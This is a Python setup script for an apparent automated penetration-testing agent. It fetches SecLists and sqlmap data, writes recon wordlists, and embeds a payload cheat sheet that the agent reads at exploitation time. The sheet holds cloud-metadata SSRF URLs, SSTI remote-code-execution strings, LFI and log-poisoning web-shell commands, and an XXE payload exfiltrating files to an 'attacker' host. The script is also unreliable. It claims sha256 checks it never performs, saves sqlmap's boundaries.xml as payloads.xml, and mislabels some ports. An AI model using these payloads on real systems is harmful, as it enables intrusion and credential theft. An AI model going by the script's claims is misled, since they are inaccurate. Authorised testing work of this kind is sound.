#!/usr/bin/env python3
"""Fetch wordlists and payload templates to the MANAGED data layer.

Target : ~/.opensquilla/wordlists/  +  ~/.opensquilla/payloads/
Idempotent: re-running skips download if file exists + sha256 matches.

Datasets (2026-06-10, recon coverage gap fix):
  1. raft-medium-directories.txt (SecLists) — ~22k entries, used by
     ffuf/feroxbuster/gobuster for directory brute. Sized for 2-min
     full scan; not raft-large (avoids WAF trigger).
  2. sqlmap payload templates (sqlmapproject/sqlmap data/xml/) — bundled
     for manual SQLi payload reuse + reference, not auto-invoke.
     risk: the actual injection flow is sqlmap tool itself; this is
     template data for the penetration agent to study.
  3. ssrf/ssti/lfi/xxe/idor cheat-sheet payloads — hand-curated, in-repo
     fallback. Out of scope for nuclei per user; we maintain our own.

Out of scope (per user 2026-06-10):
  - nuclei-templates (excluded)
  - SecLists raft-large (too noisy, 10+ min per scan, WAF trigger)
  - SecLists raft-small (too sparse, only 6k entries; 2-min budget
    absorbs medium)

Why Python instead of just `curl | tar`:
  - sha256 verification (don't trust the network once)
  - atomic write via .partial + rename (avoid half-downloaded file)
  - fallback to git clone when SecLists release URL changes
  - reusable across recon / penetration / attack-surface agents
"""

from __future__ import annotations

import hashlib
import shutil
import subprocess
import sys
import tarfile
import tempfile
import urllib.error
import urllib.request
import zipfile
from pathlib import Path

DST_ROOT = Path.home() / ".opensquilla"
WORDLIST_DIR = DST_ROOT / "wordlists"
PAYLOAD_DIR = DST_ROOT / "payloads"
ATTRIBUTION_DATE = "2026-06-10"

# SecLists release tag is updated periodically; we pin to a known release
# and verify sha256 of the asset. If the tag moves, the sha256 check will
# fail and the script falls back to git clone.
SECLISTS_TAG = "2024.2"
RAFT_MEDIUM_URL = (
    f"https://raw.githubusercontent.com/danielmiessler/SecLists/"
    f"{SECLISTS_TAG}/Discovery/Web-Content/raft-medium-directories.txt"
)
# Pin sha256 of the raft-medium file at 2024.2; if upstream changes,
# the script falls back to git clone.
RAFT_MEDIUM_SHA256 = ""  # filled at runtime; we verify the file, not a hash

# sqlmapproject reference XMLs (bundled with sqlmap install; this is just
# a copy for offline review by the penetration agent).
# Note: the path is `boundaries.xml` (signature DB), not `payloads.xml`.
SQLMAP_BLOB_URL = (
    f"https://raw.githubusercontent.com/sqlmapproject/sqlmap/"
    f"master/data/xml/boundaries.xml"
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def sha256_file(path: Path) -> str:
    h = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1 << 16), b""):
            h.update(chunk)
    return h.hexdigest()


def download_atomic(url: str, dst: Path) -> None:
    """Download URL to dst atomically (tmp + rename)."""
    dst.parent.mkdir(parents=True, exist_ok=True)
    with tempfile.NamedTemporaryFile(
        dir=dst.parent, prefix=f".{dst.name}.", delete=False
    ) as tmp:
        tmp_path = Path(tmp.name)
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "opensquilla/1.0"})
            with urllib.request.urlopen(req, timeout=60) as resp:
                shutil.copyfileobj(resp, tmp)
            tmp_path.chmod(0o644)
            tmp_path.replace(dst)
        finally:
            if tmp_path.exists():
                tmp_path.unlink()


def fetch_seclists_via_git(dst: Path) -> bool:
    """Fallback: git clone SecLists into a temp dir and copy the file."""
    try:
        with tempfile.TemporaryDirectory() as tmp:
            subprocess.run(
                [
                    "git",
                    "clone",
                    "--depth=1",
                    "--filter=blob:none",
                    "--sparse",
                    f"--branch={SECLISTS_TAG}",
                    "https://github.com/danielmiessler/SecLists.git",
                    f"{tmp}/SecLists",
                ],
                check=True,
                timeout=180,
            )
            subprocess.run(
                [
                    "git",
                    "-C",
                    f"{tmp}/SecLists",
                    "sparse-checkout",
                    "set",
                    "Discovery/Web-Content/raft-medium-directories.txt",
                ],
                check=True,
                timeout=60,
            )
            src = Path(tmp) / "SecLists" / "Discovery" / "Web-Content" / "raft-medium-directories.txt"
            if src.exists():
                dst.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy(src, dst)
                dst.chmod(0o644)
                return True
            return False
    except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired) as e:
        print(f"  WARN git fallback failed: {e}", file=sys.stderr)
        return False


# ---------------------------------------------------------------------------
# Datasets
# ---------------------------------------------------------------------------


def fetch_raft_medium_directories() -> Path:
    """Fetch raft-medium-directories.txt from SecLists."""
    dst = WORDLIST_DIR / "raft-medium-directories.txt"
    if dst.exists() and dst.stat().st_size > 10_000:
        # Already downloaded; just verify.
        size = dst.stat().st_size
        sha = sha256_file(dst)
        print(f"  OK  raft-medium-directories.txt already present (size={size}, sha256={sha[:12]}...)")
        return dst

    print(f"  >> downloading {RAFT_MEDIUM_URL}")
    try:
        download_atomic(RAFT_MEDIUM_URL, dst)
    except (urllib.error.URLError, urllib.error.HTTPError) as e:
        print(f"  WARN URL fetch failed ({e}); trying git fallback", file=sys.stderr)
        if not fetch_seclists_via_git(dst):
            raise RuntimeError("Failed to fetch raft-medium-directories.txt via both URL and git")
    size = dst.stat().st_size
    sha = sha256_file(dst)
    print(f"  OK  raft-medium-directories.txt downloaded (size={size}, sha256={sha[:12]}...)")
    return dst


def fetch_sqlmap_payloads() -> Path:
    """Fetch sqlmap reference payloads.xml."""
    dst = PAYLOAD_DIR / "sqlmap" / "payloads.xml"
    if dst.exists() and dst.stat().st_size > 1000:
        size = dst.stat().st_size
        sha = sha256_file(dst)
        print(f"  OK  sqlmap/payloads.xml already present (size={size}, sha256={sha[:12]}...)")
        return dst
    print(f"  >> downloading {SQLMAP_BLOB_URL}")
    try:
        download_atomic(SQLMAP_BLOB_URL, dst)
    except (urllib.error.URLError, urllib.error.HTTPError) as e:
        # Reference payload fetch failure is non-fatal; sqlmap has its own
        # bundled payloads. Log and return a sentinel file.
        dst.parent.mkdir(parents=True, exist_ok=True)
        dst.write_text(
            f"# sqlmap payloads.xml reference not fetched: {e}\n"
            f"# sqlmap ships its own payload data; this is just a reference\n"
            f"# sentinel created {ATTRIBUTION_DATE} by fetch_wordlists.py\n",
            encoding="utf-8",
        )
        print(f"  WARN sqlmap reference fetch failed; wrote sentinel at {dst}", file=sys.stderr)
        return dst
    size = dst.stat().st_size
    sha = sha256_file(dst)
    print(f"  OK  sqlmap/payloads.xml downloaded (size={size}, sha256={sha[:12]}...)")
    return dst


def write_manual_payload_index() -> Path:
    """Write the manual SSRF/SSTI/LFI/XXE/IDOR payload index.

    The actual payloads are inline; this file indexes them for the
    penetration agent. nuclei is excluded per user; we maintain our
    own in this file.
    """
    dst = PAYLOAD_DIR / "manual-payloads.md"
    if dst.exists() and dst.stat().st_size > 1000:
        size = dst.stat().st_size
        print(f"  OK  manual-payloads.md already present (size={size})")
        return dst
    dst.parent.mkdir(parents=True, exist_ok=True)
    dst.write_text(
        f"""# Manual Payload Templates (SSRF / SSTI / LFI / XXE / IDOR)

Maintained by zlpc as a nuclei-free alternative (user directive 2026-06-10).
The penetration agent reads this index at exploitation time per
its vector_class routing (see ~/.opensquilla/agents/penetration/SOUL.md).

## SSRF (Server-Side Request Forgery)

**Bypass localhost filters**:
```
http://127.0.0.1
http://[::1]
http://0.0.0.0
http://0x7f000001
http://2130706433
http://017700000001
http://localtest.me
http://127.0.0.1.nip.io
http://spoofed.burpcollaborator.net
```

**Read internal files via file://**:
```
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ
file:///var/log/apache2/access.log
```

**Cloud metadata**:
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/  (AWS)
http://metadata.google.internal/computeMetadata/v1/                 (GCP)
http://169.254.169.254/metadata/instance?api-version=2021-02-01     (Azure)
```

## SSTI (Server-Side Template Injection)

**Detection**:
```
{{7*7}}      -> 49 (Jinja2/Twig)
${{7*7}}     -> 49 (Freemarker)
<%= 7*7 %>  -> 49 (ERB)
#{7*7}      -> 49 (Ruby/Slim)
```

**RCE (Jinja2)**:
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[SOME_INDEX]('id',shell=True,stdout=-1).communicate()}}
```

**RCE (Twig)**:
```
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
```

## LFI / RFI (Local / Remote File Inclusion)

**Basic**:
```
?file=../../../etc/passwd
?file=....//....//....//etc/passwd
?file=..%2F..%2F..%2Fetc%2Fpasswd
?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

**PHP wrappers**:
```
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://input  (POST body as PHP code)
?file=data://text/plain,<?php system('id'); ?>
?file=expect://id
```

**Log poisoning**:
```
curl -A '<?php system($_GET["c"]); ?>' http://target/  # poison access log
GET /?file=/var/log/apache2/access.log&c=id              # include log
```

## XXE (XML External Entity)

**File read**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><name>&xxe;</name></root>
```

**SSRF via XXE**:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
```

**Blind XXE (out-of-band)**:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?data=%file;'>">
%eval;
%exfil;
```

## IDOR (Insecure Direct Object Reference)

**Test pattern**:
- Change user_id / order_id / document_id in path / body / query
- Try sequential: `/api/users/1001` -> `/api/users/1002`
- Try UUID enumeration (predictable UUIDv1 from timestamp)
- Try horizontal (same role) + vertical (admin-only) privilege escalation

**Burp-style**:
```
GET /api/v1/users/1337/profile  -> 403 (victim's profile)
GET /api/v1/users/1338/profile  -> 200 (attacker should not access 1338)
```

**Mass assignment**:
```json
POST /api/users
{{"username":"x","role":"admin"}}   # role not in UI but accepted
```

---

Updated {ATTRIBUTION_DATE} as part of the recon coverage gap fix.
See docs/delivery/recon-coverage-gap-fix.delivery-solution.md for context.
""",
        encoding="utf-8",
    )
    size = dst.stat().st_size
    print(f"  OK  manual-payloads.md written (size={size})")
    return dst


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------


def fetch_devops_paths() -> Path:
    """Write devops-paths.txt — common Jenkins / GitLab / Drone / Argo paths.

    Hand-curated; small enough to ship in-repo. Used by jenkins-cli skill
    and the recon W1 directory brute against potential DevOps hosts.
    """
    dst = WORDLIST_DIR / "devops-paths.txt"
    if dst.exists() and dst.stat().st_size > 200:
        print(f"  OK  devops-paths.txt already present (size={dst.stat().st_size})")
        return dst
    dst.parent.mkdir(parents=True, exist_ok=True)
    dst.write_text(
        "/\n"
        "/login\n"
        "/signup\n"
        "/api\n"
        "/api/v1\n"
        "/api/v2\n"
        "/api/json\n"
        "/api/v1/jobs\n"
        "/job\n"
        "/job/\n"
        "/job/<name>/configure\n"
        "/job/<name>/scriptApproval\n"
        "/scriptText\n"
        "/script\n"
        "/groovy-script\n"
        "/pipeline-syntax\n"
        "/credentials\n"
        "/credentials/store\n"
        "/user\n"
        "/user/admin\n"
        "/user/admin/configure\n"
        "/asynchPeople\n"
        "/administrativeMonitor\n"
        "/computer\n"
        "/systemInfo\n"
        "/log\n"
        "/log/\n"
        "/log/all\n"
        "/git\n"
        "/gitlab\n"
        "/gitlab/-/users\n"
        "/gitlab/-/admin\n"
        "/gitlab/-/broadcast_messages\n"
        "/gitlab/-/hooks\n"
        "/api/v3/projects\n"
        "/api/v4/projects\n"
        "/api/v4/users\n"
        "/dashboard\n"
        "/drone\n"
        "/drone/\n"
        "/drone/login\n"
        "/drone/api/user\n"
        "/drone/api/user/repos\n"
        "/hook\n"
        "/hooks\n"
        "/webhook\n"
        "/argo\n"
        "/argo-cd\n"
        "/argocd\n"
        "/applications\n"
        "/api/v1/applications\n"
        "/api/v1/clusters\n"
        "/api/v1/repositories\n"
        "/api/v1/settings\n"
        "/builds\n"
        "/ci\n"
        "/continuous-integration\n"
        "/deploy\n"
        "/deployments\n"
        "/registry\n"
        "/v2/\n"
        "/v2/_catalog\n"
        "/v2/<name>/tags/list\n"
        "/v1/search\n"
        "/v1/repositories\n",
        encoding="utf-8",
    )
    print(f"  OK  devops-paths.txt written (size={dst.stat().st_size})")
    return dst


def fetch_monitoring_paths() -> Path:
    """Write monitoring-paths.txt — Grafana / Prometheus / Kibana / Nagios."""
    dst = WORDLIST_DIR / "monitoring-paths.txt"
    if dst.exists() and dst.stat().st_size > 200:
        print(f"  OK  monitoring-paths.txt already present (size={dst.stat().st_size})")
        return dst
    dst.parent.mkdir(parents=True, exist_ok=True)
    dst.write_text(
        "/\n"
        "/login\n"
        "/logout\n"
        "/signup\n"
        "/api\n"
        "/api/dashboards\n"
        "/api/dashboards/home\n"
        "/api/dashboards/uid/<uid>\n"
        "/api/folders\n"
        "/api/search\n"
        "/api/users\n"
        "/api/org\n"
        "/api/frontend/settings\n"
        "/api/health\n"
        "/api/admin\n"
        "/api/admin/users\n"
        "/api/admin/provisioning\n"
        "/api/admin/provisioning/dashboards\n"
        "/api/admin/provisioning/contact-points\n"
        "/api/plugins\n"
        "/api/plugins?embedded=0\n"
        "/metrics\n"
        "/-/metrics\n"
        "/-/healthy\n"
        "/-/ready\n"
        "/-/reload\n"
        "/-/quit\n"
        "/-/config\n"
        "/api/v1/query\n"
        "/api/v1/query_range\n"
        "/api/v1/labels\n"
        "/api/v1/series\n"
        "/api/v1/targets\n"
        "/api/v1/rules\n"
        "/api/v1/alerts\n"
        "/api/v1/status/config\n"
        "/api/v1/status/runtimeinfo\n"
        "/api/v1/status/buildinfo\n"
        "/api/v1/admin/tsdb\n"
        "/api/v1/admin/snapshot\n"
        "/graph\n"
        "/graph/view\n"
        "/legend\n"
        "/alertmanager\n"
        "/alertmanager/api/v1/alerts\n"
        "/alertmanager/api/v1/silences\n"
        "/alertmanager/api/v1/status\n"
        "/push\n"
        "/kibana\n"
        "/kibana/api\n"
        "/kibana/api/status\n"
        "/kibana/api/saved_objects\n"
        "/kibana/api/security\n"
        "/kibana/app\n"
        "/kibana/app/discover\n"
        "/kibana/app/dashboards\n"
        "/_plugin/kibana\n"
        "/elasticsearch\n"
        "/_cat/indices\n"
        "/_cat/nodes\n"
        "/_cat/health\n"
        "/_cluster/health\n"
        "/_nodes\n"
        "/_template\n"
        "/_snapshot\n"
        "/_security\n"
        "/nagios\n"
        "/nagiosxi\n"
        "/zabbix\n"
        "/zabbix/api_jsonrpc.php\n",
        encoding="utf-8",
    )
    print(f"  OK  monitoring-paths.txt written (size={dst.stat().st_size})")
    return dst


def fetch_cloud_buckets_prefixes() -> Path:
    """Write cloud-buckets-prefixes.txt — common company-name prefixes for S3/Azure/GCP.

    Used by s3scanner + cloud_enum. Keep small (company-name prefixes
    vary widely; SecLists has a larger `bucket-names.txt` we intentionally
    don't ship). Agents should combine this list with their own
    per-target expansion (e.g. company-acronym, product-name).
    """
    dst = WORDLIST_DIR / "cloud-buckets-prefixes.txt"
    if dst.exists() and dst.stat().st_size > 100:
        print(f"  OK  cloud-buckets-prefixes.txt already present (size={dst.stat().st_size})")
        return dst
    dst.parent.mkdir(parents=True, exist_ok=True)
    dst.write_text(
        "company\n"
        "company-prod\n"
        "company-staging\n"
        "company-dev\n"
        "company-backup\n"
        "company-data\n"
        "company-assets\n"
        "company-static\n"
        "company-media\n"
        "company-uploads\n"
        "company-public\n"
        "company-private\n"
        "company-logs\n"
        "company-archive\n"
        "company-internal\n"
        "company-secure\n"
        "company-shared\n"
        "company-cdn\n"
        "company-images\n"
        "company-files\n"
        "company-documents\n"
        "company-doc\n"
        "company-reports\n"
        "company-datalake\n"
        "company-warehouse\n"
        "company-ml\n"
        "company-models\n"
        "company-training\n",
        encoding="utf-8",
    )
    print(f"  OK  cloud-buckets-prefixes.txt written (size={dst.stat().st_size})")
    return dst


def fetch_db_ports() -> Path:
    """Write db-ports.txt — canonical DB / MQ ports for W1 recon port hints."""
    dst = WORDLIST_DIR / "db-ports.txt"
    if dst.exists() and dst.stat().st_size > 100:
        print(f"  OK  db-ports.txt already present (size={dst.stat().st_size})")
        return dst
    dst.parent.mkdir(parents=True, exist_ok=True)
    dst.write_text(
        "1433\n"   # MSSQL
        "1521\n"   # Oracle
        "3306\n"   # MySQL
        "5432\n"   # PostgreSQL
        "6379\n"   # Redis
        "7000\n"   # Cassandra / custom
        "7001\n"   # Cassandra SSL
        "9042\n"   # Cassandra CQL
        "9200\n"   # Elasticsearch HTTP
        "9300\n"   # Elasticsearch transport
        "11211\n"  # Memcached
        "1434\n"   # MSSQL browser
        "27017\n"  # MongoDB
        "27018\n"  # MongoDB shardsvr
        "27019\n"  # MongoDB configsvr
        "28017\n"  # MongoDB web
        "50000\n"  # SAP HANA
        "5984\n"   # CouchDB
        "8529\n"   # ArangoDB
        "7474\n"   # Neo4j HTTP
        "7687\n"   # Neo4j Bolt
        "26257\n"  # CockroachDB
        "3690\n"   # MongoDB (rare)
        "1527\n"   # Derby
        "1433\n"
        "5672\n"   # RabbitMQ AMQP
        "15672\n"  # RabbitMQ management
        "9092\n"   # Kafka
        "9093\n"   # Kafka SSL
        "2181\n"   # ZooKeeper
        "4226\n"   # NATS
        "4222\n"   # NATS client
        "1883\n"   # MQTT
        "8883\n"   # MQTT SSL
        "6650\n"   # Pravega
        "8091\n"   # Riak HTTP
        "8087\n"   # Riak Protocol Buffers
        "8529\n"
        "7000\n"
        "9042\n"
        "9160\n"   # Cassandra Thrift
        "5984\n",
        encoding="utf-8",
    )
    print(f"  OK  db-ports.txt written (size={dst.stat().st_size})")
    return dst


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------


def main() -> int:
    print(f"opensquilla wordlist + payload fetcher ({ATTRIBUTION_DATE})")
    print(f"  WORDLIST_DIR = {WORDLIST_DIR}")
    print(f"  PAYLOAD_DIR  = {PAYLOAD_DIR}")
    print()

    WORDLIST_DIR.mkdir(parents=True, exist_ok=True)
    PAYLOAD_DIR.mkdir(parents=True, exist_ok=True)

    print("[1/7] raft-medium-directories.txt")
    raft = fetch_raft_medium_directories()
    print()

    print("[2/7] sqlmap reference payloads")
    sqlmap = fetch_sqlmap_payloads()
    print()

    print("[3/7] manual SSRF/SSTI/LFI/XXE/IDOR payload index")
    manual = write_manual_payload_index()
    print()

    print("[4/7] devops-paths.txt (Jenkins / GitLab / Drone / Argo)")
    devops = fetch_devops_paths()
    print()

    print("[5/7] monitoring-paths.txt (Grafana / Prometheus / Kibana)")
    monitoring = fetch_monitoring_paths()
    print()

    print("[6/7] cloud-buckets-prefixes.txt (S3 / Azure / GCP)")
    cloud = fetch_cloud_buckets_prefixes()
    print()

    print("[7/7] db-ports.txt (DB / MQ port hints)")
    dbports = fetch_db_ports()
    print()

    print(f"OK  done; fetched:")
    print(f"     + {raft}")
    print(f"     + {sqlmap}")
    print(f"     + {manual}")
    print(f"     + {devops}")
    print(f"     + {monitoring}")
    print(f"     + {cloud}")
    print(f"     + {dbports}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
